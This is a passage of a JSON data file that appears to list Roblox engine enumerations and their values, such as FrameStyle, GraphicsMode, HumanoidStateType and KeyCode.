lue":2,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":3,"Enum":"FormFactor"},{"type":"Enum","Name":"FrameStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatBlue","tags":[],"Value":1,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxSquare","tags":[],"Value":2,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxRound","tags":[],"Value":3,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatGreen","tags":[],"Value":4,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatRed","tags":[],"Value":5,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"DropShadow","tags":[],"Value":6,"Enum":"FrameStyle"},{"type":"Enum","Name":"FramerateManagerMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"FramerateManagerMode"},{"type":"Enum","Name":"FriendRequestEvent","tags":[]},{"type":"EnumItem","Name":"Issue","tags":[],"Value":0,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Revoke","tags":[],"Value":1,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Accept","tags":[],"Value":2,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Deny","tags":[],"Value":3,"Enum":"FriendRequestEvent"},{"type":"Enum","Name":"FriendStatus","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"NotFriend","tags":[],"Value":1,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"Friend","tags":[],"Value":2,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestSent","tags":[],"Value":3,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestReceived","tags":[],"Value":4,"Enum":"FriendStatus"},{"type":"Enum","Name":"FunctionalTestResult","tags":[]},{"type":"EnumItem","Name":"Passed","tags":[],"Value":0,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Warning","tags":[],"Value":1,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Error","tags":[],"Value":2,"Enum":"FunctionalTestResult"},{"type":"Enum","Name":"GameAvatarType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"GameAvatarType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"GameAvatarType"},{"type":"EnumItem","Name":"PlayerChoice","tags":[],"Value":2,"Enum":"GameAvatarType"},{"type":"Enum","Name":"GearGenreSetting","tags":[]},{"type":"EnumItem","Name":"AllGenres","tags":[],"Value":0,"Enum":"GearGenreSetting"},{"type":"EnumItem","Name":"MatchingGenreOnly","tags":[],"Value":1,"Enum":"GearGenreSetting"},{"type":"Enum","Name":"GearType","tags":[]},{"type":"EnumItem","Name":"MeleeWeapons","tags":[],"Value":0,"Enum":"GearType"},{"type":"EnumItem","Name":"RangedWeapons","tags":[],"Value":1,"Enum":"GearType"},{"type":"EnumItem","Name":"Explosives","tags":[],"Value":2,"Enum":"GearType"},{"type":"EnumItem","Name":"PowerUps","tags":[],"Value":3,"Enum":"GearType"},{"type":"EnumItem","Name":"NavigationEnhancers","tags":[],"Value":4,"Enum":"GearType"},{"type":"EnumItem","Name":"MusicalInstruments","tags":[],"Value":5,"Enum":"GearType"},{"type":"EnumItem","Name":"SocialItems","tags":[],"Value":6,"Enum":"GearType"},{"type":"EnumItem","Name":"BuildingTools","tags":[],"Value":7,"Enum":"GearType"},{"type":"EnumItem","Name":"Transport","tags":[],"Value":8,"Enum":"GearType"},{"type":"Enum","Name":"Genre","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"Genre"},{"type":"EnumItem","Name":"TownAndCity","tags":[],"Value":1,"Enum":"Genre"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":2,"Enum":"Genre"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":3,"Enum":"Genre"},{"type":"EnumItem","Name":"Ninja","tags":[],"Value":4,"Enum":"Genre"},{"type":"EnumItem","Name":"Scary","tags":[],"Value":5,"Enum":"Genre"},{"type":"EnumItem","Name":"Pirate","tags":[],"Value":6,"Enum":"Genre"},{"type":"EnumItem","Name":"Adventure","tags":[],"Value":7,"Enum":"Genre"},{"type":"EnumItem","Name":"Sports","tags":[],"Value":8,"Enum":"Genre"},{"type":"EnumItem","Name":"Funny","tags":[],"Value":9,"Enum":"Genre"},{"type":"EnumItem","Name":"WildWest","tags":[],"Value":10,"Enum":"Genre"},{"type":"EnumItem","Name":"War","tags":[],"Value":11,"Enum":"Genre"},{"type":"EnumItem","Name":"SkatePark","tags":[],"Value":12,"Enum":"Genre"},{"type":"EnumItem","Name":"Tutorial","tags":[],"Value":13,"Enum":"Genre"},{"type":"Enum","Name":"GraphicsMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":1,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D9","tags":[],"Value":3,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D11","tags":[],"Value":2,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"OpenGL","tags":[],"Value":4,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":5,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Vulkan","tags":[],"Value":6,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"NoGraphics","tags":[],"Value":7,"Enum":"GraphicsMode"},{"type":"Enum","Name":"HandlesStyle","tags":[]},{"type":"EnumItem","Name":"Resize","tags":[],"Value":0,"Enum":"HandlesStyle"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"HandlesStyle"},{"type":"Enum","Name":"HorizontalAlignment","tags":[]},{"type":"EnumItem","Name":"Center","tags":[],"Value":0,"Enum":"HorizontalAlignment"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"HorizontalAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"HorizontalAlignment"},{"type":"Enum","Name":"HttpContentType","tags":[]},{"type":"EnumItem","Name":"ApplicationJson","tags":[],"Value":0,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationXml","tags":[],"Value":1,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationUrlEncoded","tags":[],"Value":2,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextPlain","tags":[],"Value":3,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextXml","tags":[],"Value":4,"Enum":"HttpContentType"},{"type":"Enum","Name":"HttpRequestType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"HttpRequestType"},{"type":"EnumItem","Name":"MarketplaceService","tags":[],"Value":2,"Enum":"HttpRequestType"},{"type":"EnumItem","Name":"Players","tags":[],"Value":7,"Enum":"HttpRequestType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":15,"Enum":"HttpRequestType"},{"type":"EnumItem","Name":"Avatar","tags":[],"Value":16,"Enum":"HttpRequestType"},{"type":"Enum","Name":"HumanoidDisplayDistanceType","tags":[]},{"type":"EnumItem","Name":"Viewer","tags":[],"Value":0,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"Subject","tags":[],"Value":1,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"HumanoidDisplayDistanceType"},{"type":"Enum","Name":"HumanoidHealthDisplayType","tags":[]},{"type":"EnumItem","Name":"DisplayWhenDamaged","tags":[],"Value":0,"Enum":"HumanoidHealthDisplayType"},{"type":"EnumItem","Name":"AlwaysOn","tags":[],"Value":1,"Enum":"HumanoidHealthDisplayType"},{"type":"EnumItem","Name":"AlwaysOff","tags":[],"Value":2,"Enum":"HumanoidHealthDisplayType"},{"type":"Enum","Name":"HumanoidRigType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"HumanoidRigType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"HumanoidRigType"},{"type":"Enum","Name":"HumanoidStateType","tags":[]},{"type":"EnumItem","Name":"FallingDown","tags":[],"Value":0,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Running","tags":[],"Value":8,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"RunningNoPhysics","tags":[],"Value":10,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Climbing","tags":[],"Value":12,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"StrafingNoPhysics","tags":[],"Value":11,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Ragdoll","tags":[],"Value":1,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"GettingUp","tags":[],"Value":2,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Jumping","tags":[],"Value":3,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Landed","tags":[],"Value":7,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Flying","tags":[],"Value":6,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Freefall","tags":[],"Value":5,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Seated","tags":[],"Value":13,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"PlatformStanding","tags":[],"Value":14,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Dead","tags":[],"Value":15,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Swimming","tags":[],"Value":4,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Physics","tags":[],"Value":16,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"None","tags":[],"Value":18,"Enum":"HumanoidStateType"},{"type":"Enum","Name":"InOut","tags":[]},{"type":"EnumItem","Name":"Edge","tags":[],"Value":0,"Enum":"InOut"},{"type":"EnumItem","Name":"Inset","tags":[],"Value":1,"Enum":"InOut"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"InOut"},{"type":"Enum","Name":"InfoType","tags":[]},{"type":"EnumItem","Name":"Asset","tags":[],"Value":0,"Enum":"InfoType"},{"type":"EnumItem","Name":"Product","tags":[],"Value":1,"Enum":"InfoType"},{"type":"EnumItem","Name":"GamePass","tags":[],"Value":2,"Enum":"InfoType"},{"type":"Enum","Name":"InputType","tags":[]},{"type":"EnumItem","Name":"NoInput","tags":[],"Value":0,"Enum":"InputType"},{"type":"EnumItem","Name":"LeftTread","tags":[],"Value":1,"Enum":"InputType"},{"type":"EnumItem","Name":"RightTread","tags":[],"Value":2,"Enum":"InputType"},{"type":"EnumItem","Name":"Steer","tags":[],"Value":3,"Enum":"InputType"},{"type":"EnumItem","Name":"Throttle","tags":[],"Value":4,"Enum":"InputType"},{"type":"EnumItem","Name":"UpDown","tags":[],"Value":6,"Enum":"InputType"},{"type":"EnumItem","Name":"Action1","tags":[],"Value":7,"Enum":"InputType"},{"type":"EnumItem","Name":"Action2","tags":[],"Value":8,"Enum":"InputType"},{"type":"EnumItem","Name":"Action3","tags":[],"Value":9,"Enum":"InputType"},{"type":"EnumItem","Name":"Action4","tags":[],"Value":10,"Enum":"InputType"},{"type":"EnumItem","Name":"Action5","tags":[],"Value":11,"Enum":"InputType"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":12,"Enum":"InputType"},{"type":"EnumItem","Name":"Sin","tags":[],"Value":13,"Enum":"InputType"},{"type":"Enum","Name":"JointCreationMode","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"Surface","tags":[],"Value":1,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"JointCreationMode"},{"type":"Enum","Name":"JointType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":28,"Enum":"JointType"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":7,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateP","tags":[],"Value":8,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateV","tags":[],"Value":9,"Enum":"JointType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":10,"Enum":"JointType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":1,"Enum":"JointType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":3,"Enum":"JointType"},{"type":"Enum","Name":"KeyCode","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backspace","tags":[],"Value":8,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tab","tags":[],"Value":9,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Clear","tags":[],"Value":12,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Return","tags":[],"Value":13,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":19,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Escape","tags":[],"Value":27,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Space","tags":[],"Value":32,"Enum":"KeyCode"},{"type":"EnumItem","Name":"QuotedDouble","tags":[],"Value":34,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Hash","tags":[],"Value":35,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Dollar","tags":[],"Value":36,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Percent","tags":[],"Value":37,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Ampersand","tags":[],"Value":38,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Quote","tags":[],"Value":39,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftParenthesis","tags":[],"Value":40,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightParenthesis","tags":[],"Value":41,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Asterisk","tags":[],"Value":42,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Plus","tags":[],"Value":43,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Comma","tags":[],"Value":44,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Minus","tags":[],"Value":45,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Period","tags":[],"Value":46,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Slash","tags":[],"Value":47,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Zero","tags":[],"Value":48,"Enum":"KeyCode"},{"type":"EnumItem","Name":"One","tags":[],"Value":49,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Two","tags":[],"Value":50,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Three","tags":[],"Value":51,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Four","tags":[],"Value":52,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Five","tags":[],"Value":53,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Six","tags":[],"Value":54,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Seven","tags":[],"Value":55,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Eight","tags":[],"Value":56,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Nine","tags":[],"Value":57,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Colon","tags":[],"Value":58,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Semicolon","tags":[],"Value":59,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LessThan","tags":[],"Value":60,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Equals","tags":[],"Value":61,"Enum":"KeyCode"},{"type":"EnumItem","Name":"GreaterThan","tags":[],"Value":62,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Question","tags":[],"Value":63,"Enum":"KeyCode"},{"type":"EnumItem","Name":"At","tags":[],"Value":64,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftBracket","tags":[],"Value":91,"Enum":"KeyCode"},{"type":"EnumItem","Name":"BackSlash","tags":[],"Value":92,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightBracket","tags":[],"Value":93,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Caret","tags":[],"Value":94,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Underscore","tags":[],"Value":95,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backquote","tags":[],"Value":96,"Enum":"KeyCode"},{"type":"EnumItem","Name":"A","tags":[],"Value":97,"Enum":"KeyCode"},{"type":"EnumItem","Name":"B","tags":[],"Value":98,"Enum":"KeyCode"},{"type":"EnumItem","Name":"C","tags":[],"Value":99,"Enum":"KeyCode"},{"type":"EnumItem","Name":"D","tags":[],"Value":100,"Enum":"KeyCode"},{"type":"EnumItem","Name":"E","tags":[],"Value":101,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F","tags":[],"Value":102,"Enum":"KeyCode"},{"type":"EnumItem","Name":"G","tags":[],"Value":103,"Enum":"KeyCode"},{"type":"EnumItem","Name":"H","tags":[],"Value":104,"Enum":"KeyCode"},{"type":"EnumItem","Name":"I","tags":[],"Value":105,"Enum":"KeyCode"},{"type":"EnumItem","Name":"J","tags":[],"Value":106,"Enum":"KeyCode"},{"type":"EnumItem","Name":"K","tags":[],"Value":107,"Enum":"KeyCode"},{"type":"EnumItem","Name":"L","tags":[],"Value":108,"Enum":"KeyCode"},{"type":"EnumItem","Name":"M","tags":[],"Value":109,"Enum":"KeyCode"},{"type":"EnumItem","Name":"N","tags":[],"Value":110,"Enum":"KeyCode"},{"type":"EnumItem","Name":"O","tags":[],"Value":111,"Enum":"KeyCode"},{"type":"EnumItem","Name":"P","tags":[],"Value":112,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Q","tags":[],"Value":113,"Enum":"KeyCode"},{"type":"EnumItem","Name":"R","tags":[],"Value":114,"Enum":"KeyCode"},{"type":"EnumItem","Name":"S","tags":[],"Value":115,"Enum":"KeyCode"},{"type":"EnumItem","Name":"T","tags":[],"Value":116,"Enum":"KeyCode"},{"type":"EnumItem","Name":"U","tags":[],"Value":117,"Enum":"KeyCode"},{"type":"EnumItem","Name":"V","tags":[],"Value":118,"Enum":"KeyCode"},{"type":"EnumItem","Name":"W","tags":[],"Value":119,"Enum":"KeyCode"},{"type":"EnumItem","Name":"X","tags":[],"Value":120,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Y","tags":[],"Value":121,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Z","tags":[],"Value":122,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftCurly","tags":[],"Value":123,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pipe","tags":[],"Value":124,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightCurly","tags":[],"Value":125,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tilde","tags":[],"Value":126,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Delete","tags":[],"Value":127,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadZero","tags":[],"Value":256,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadOne","tags":[],"Value":257,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadTwo","tags":[],"Value":258,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadThree","tags":[],"Value":259,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFour","tags":[],"Value":260,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFive","tags":[],"Value":261,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSix","tags":[],"Value":262,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSeven","tags":[],"Value":263,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEight","tags":[],"Value":264,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadNine","tags":[],"Value":265,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPeriod","tags":[],"Value":266,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadDivide","tags":[],"Value":267,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMultiply","tags":[],"Value":268,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMinus","tags":[],"Value":269,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPlus","tags":[],"Value":270,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEnter","tags":[],"Value":271,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEquals","tags":[],"Value":272,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Up","tags":[],"Value":273,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Down","tags":[],"Value":274,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Right","tags":[],"Value":275,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Left","tags":[],"Value":276,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Insert","tags":[],"Value":277,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Home","tags":[],"Value":278,"Enum":"KeyCode"},{"type":"EnumItem","Name":"End","tags":[],"Value":279,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":280,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":281,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftShift","tags":[],"Value":304,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightShift","tags":[],"Value":303,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftMeta","tags":[],"Value":310,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightMeta","tags":[],"Value":309,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftAlt","tags":[],"Value":308,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightAlt","tags":[],"Value":307,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftControl","tags":[],"Value":306,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightControl","tags":[],"Value":305,"Enum":"KeyCode"},{"type":"EnumItem","Name":"CapsLock","tags":[],"Value":301,"Enum":"KeyCode"},{"type":"EnumItem","Name":"NumLock","tags":[],"Value":300,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ScrollLock","tags":[],"Value":302,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftSuper","tags":[],"Value":311,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightSuper","tags":[],"Value":312,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Mode","tags":[],"Value":313,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Compose","tags":[],"Value":314,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Help","tags":[],"Value":315,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Print","tags":[],"Value":316,"Enum":"KeyCode"},{"type":"EnumItem","Name":"SysReq","tags":[],"Value":317,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Break","tags":[],"Value":318,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Menu","tags":[],"Value":319,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Power","tags":[],"Value":320,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Euro","tags":[],"Value":321,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Undo","tags":[],"Value":322,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F1","tags":[],"Value":282,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F2","tags":[],"Value":283,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F3","tags":[],"Value":284,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F4","tags":[],"Value":285,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F5","tags":[],"Value":286,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F6","tags":[],"Value":287,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F7","tags":[],"Value":288,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F8","tags":[],"Value":289,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F9","tags":[],"Value":290,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F10","tags":[],"Value":291,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F11","tags":[],"Value":292,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F12","tags":[],"Value":293,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F13","tags":[],"Value":294,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F14","tags":[],"Value":295,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F15","tags":[],"Value":296,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World0","tags":[],"Value":160,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World1","tags":[],"Value":161,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World2","tags":[],"Value":162,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World3","tags":[],"Value":163,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World4","tags":[],"Value":164,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World5","tags":[],"Value":165,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World6","tags":[],"Value":166,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World7","tags":[],"Value":167,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World8","tags":[],"Value":168,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World9","tags":[],"Value":169,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World10","tags":[],"Value":170,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World11","tags":[],"Value":171,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World12","tags":[],"Value":172,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World13","tags":[],"Value":173,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World14","tags":[],"Value":174,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World15","tags":[],"Value":175,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World16","tags":[],"Value":176,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World17","tags":[],"Value":177,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World18","tags":[],"Value":178,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World19","tags":[],"Value":179,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World20","tags":[],"Value":180,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World21","tags":[],"Value":181,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World22","tags":[],"Value":182,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World23","tags":[],"Value":183,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World24","tags":[],"Value":184,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World25","tags":[],"Value":185,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World26","tags":[],"Value":186,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World27","tags":[],"Value":187,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World28","tags":[],"Value":188,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World29","tags":[],"Value":189,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World30","tags":[],"Value":190,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World31","tags":[],"Value":191,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World32","tags":[],"Value":192,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World33","tags":[],"Value":193,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World34","tags":[],"Value":194,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World35","tags":[],"Value":195,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World36","tags":[],"Value":196,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World37","tags":[],"Value":197,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World38","tags":[],"Value":198,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World39","tags":[],"Value":199,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World40","tags":[],"Value":200,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World41","tags":[],"Value":201,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World42","tags":[],"Value":202,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World43","tags":[],"Value":203,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World44","tags":[],"Value":204,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World45","tags":[],"Value":205,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World46","tags":[],"Value":206,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World47","tags":[],"Value":207,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World48","tags":[],"Value":208,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World49","tags":[],"Value":209,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World50","tags":[],"Value":210,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World51","tags":[],"Value":211,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World52","tags":[],"Value":212,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World53","tags":[],"Value":213,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World54","tags":[],"Value":214,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World55","tags":[],"Value":215,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World56","tags":[],"Value":216,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World57","tags":[],"Value":217,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World58","tags":[],"Value":218,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World59","tags":[],"Value":219,"Enum":"KeyCode"},{"type":"EnumItem",